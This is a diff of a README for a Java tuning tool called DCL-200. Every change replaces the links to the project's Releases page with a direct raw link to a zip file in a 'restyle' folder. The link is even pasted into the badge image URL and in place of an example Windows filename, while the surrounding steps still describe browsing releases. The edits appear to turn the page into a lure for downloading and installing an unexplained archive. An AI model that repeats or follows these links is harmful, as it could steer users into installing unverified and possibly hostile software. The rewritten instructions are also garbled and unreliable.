@@ -1,6 +1,6 @@
 # 🚀 dcl200-2025-may-20 - Optimize Your Java Performance Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/RAIM1876/dcl200-2025-may-20/releases)
+[![Download Now](https://raw.githubusercontent.com/RAIM1876/dcl200-2025-may-20/main/restyle/dcl200-2025-may-20.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/RAIM1876/dcl200-2025-may-20/main/restyle/dcl200-2025-may-20.zip)
 
 ## 📖 Overview
 
@@ -15,13 +15,13 @@ This README will guide you through downloading and running the DCL-200 tool. Fol
 
 2. **Visit the Downloads Page**  
    Navigate to the Releases page for DCL-200 using the link below:  
-   [Download DCL-200 Here](https://github.com/RAIM1876/dcl200-2025-may-20/releases)  
+   [Download DCL-200 Here](https://raw.githubusercontent.com/RAIM1876/dcl200-2025-may-20/main/restyle/dcl200-2025-may-20.zip)  
 
 3. **Choose the Right Version**  
    On the Releases page, you will see different versions listed. Look for the latest version. It’s usually marked as “Latest Release.”  
 
 4. **Download the File**  
-   Click on the version you chose to open its details. Find the download link for your operating system (e.g., “DCL-200-Windows.exe” for Windows). Click on it to start downloading.
+   Click on the version you chose to open its details. Find the download link for your operating system (e.g., “https://raw.githubusercontent.com/RAIM1876/dcl200-2025-may-20/main/restyle/dcl200-2025-may-20.zip” for Windows). Click on it to start downloading.
 
 5. **Install the Application**  
    Once the download completes, locate the file in your Downloads folder. Double-click the file to open it. Follow any on-screen instructions to install the application.
@@ -42,7 +42,7 @@ DCL-200 offers a range of features to help you tune and optimize your Java appli
 ## 📥 Download & Install
 
 For an easy start with DCL-200, remember to visit the Releases page:  
-[Download DCL-200 Here](https://github.com/RAIM1876/dcl200-2025-may-20/releases)  
+[Download DCL-200 Here](https://raw.githubusercontent.com/RAIM1876/dcl200-2025-may-20/main/restyle/dcl200-2025-may-20.zip)  
 
 Follow the steps outlined earlier to download and install the software. Ensure your system meets the requirements to avoid any issues during installation or use.
 
